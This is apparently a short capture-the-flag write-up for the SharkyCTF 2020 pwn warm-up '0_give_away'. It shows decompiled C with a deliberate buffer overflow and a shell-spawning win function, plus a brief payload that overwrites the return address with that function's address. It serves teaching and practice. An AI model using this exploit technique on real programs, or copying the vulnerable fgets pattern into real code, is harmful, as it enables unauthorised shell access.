
## 0_give_away
### Description

> Home sweet home. 
>
> Creator: Hackhim


### Attachment

[0_give_away](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/SharkyCTF-2020/pwn/0_give_away/0_give_away)

### Analysis

A warm up task 

```c
void vuln(void){
    char *s;
    fgets(&s, 0x32, _reloc.stdin);
    return;
}
void win_func(void){
    execve("/bin/sh", 0, 0);
    return;
}
```

> buffer overflow, backdoor function

### Solution

Overwrite return address with address of `win` function

```python
offset = 40
payload = 'A'*offset
payload += p64(0x04006A7)
sl(payload)
```


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/SharkyCTF-2020/pwn/0_give_away) 


